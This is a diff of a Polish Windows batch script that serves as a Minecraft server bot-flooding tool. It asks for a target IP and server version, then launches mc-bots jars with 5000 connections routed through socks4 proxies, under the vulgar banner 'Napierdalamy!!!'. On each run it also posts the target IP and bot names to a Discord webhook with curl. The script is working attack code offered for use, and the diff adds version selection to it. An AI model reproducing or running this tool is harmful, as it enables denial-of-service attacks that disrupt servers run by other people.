@@ -33,7 +33,6 @@ echo 							   █▀▀ ▀█▀ █ █
 echo 							   █▄▄  █  █▀█   
 echo.                                               ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 echo                                                ┃                                 ┃
-echo                                                ┃           Dev: Bezik            ┃   
 echo                                                ┃  https://discord.gg/fKrgr5TmPr  ┃
 echo                                                ┃                                 ┃
 echo                                                ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
@@ -56,20 +55,34 @@ echo                                                ━━━━━━━━━�
 echo.
 echo.
 echo                                                Wybierz nazwy botów (Wybrane/Losowe)
-set /p nazwabotow= 
-if %nazwabotow%==losowe goto legitnazwy
-if %nazwabotow%==wybrane goto wybranenazwy
-echo Zla nazwa botów!
-timeout 1 >nul
-goto menu
-:wybranenazwy
-set /p nazwabotow=[36mNazwa botow: 
-echo [36mNapierdalamy!!!
-timeout 0 >nul
-curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```Server IP: %ip% Bot names: %nazwabotow%```\"}" %webhook%
-java -jar mc-bots-1.2.8.jar -s %ip% -p %nazwabotow%_ -d 0 1 -c 5000 -l C:\Users\kacpe\Desktop\boterka\proxies.txt -t socks4
-:legitnazwy
+set /p nazwabotow=
+cls
+echo.
+echo.
+echo.
+echo 							   █▀▀ ▀█▀ █ █
+echo 							   █▄▄  █  █▀█   
+echo.                                               ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+echo                                                ┃                                 ┃
+echo                                                ┃           Dev: Bezik            ┃   
+echo                                                ┃  https://discord.gg/fKrgr5TmPr  ┃
+echo                                                ┃                                 ┃
+echo                                                ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
+echo.
+echo.
+echo                                                Podaj wersje serwera (1.18.2-1.20.6)
+set /p wersja=
+if %wersja%==1.18.2 set XD=mc-bots-1.2.3.jar
+if %wersja%==1.19 set XD=mc-bots-1.2.4.jar
+if %wersja%==1.19.1 set XD=mc-bots-1.2.6.jar
+if %wersja%==1.19.2 set XD=mc-bots-1.2.6.jar
+if %wersja%==1.19.4 set XD=mc-bots-1.2.7.jar
+if %wersja%==1.20.1 set XD=mc-bots-1.2.8.jar
+if %wersja%==1.20.2 set XD=mc-bots-1.2.9.jar
+if %wersja%==1.20.4 set XD=mc-bots-1.2.10.jar
+if %wersja%==1.20.6 set XD=mc-bots-1.2.11.jar
+timeout 1>nul
 echo [36mNapierdalamy!!!
 timeout 0 >nul
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```Server IP: %ip% Bot names: Losowe```\"}" %webhook%
-java -jar mc-bots-1.2.8.jar -s %ip% -r -d 0 1 -c 5000 -l C:\Users\kacpe\Desktop\boterka\proxies.txt -t socks4
+java -jar %XD% -s %ip% -r -d 0 1 -c 5000 -l %temp%\proxies.txt -t socks4
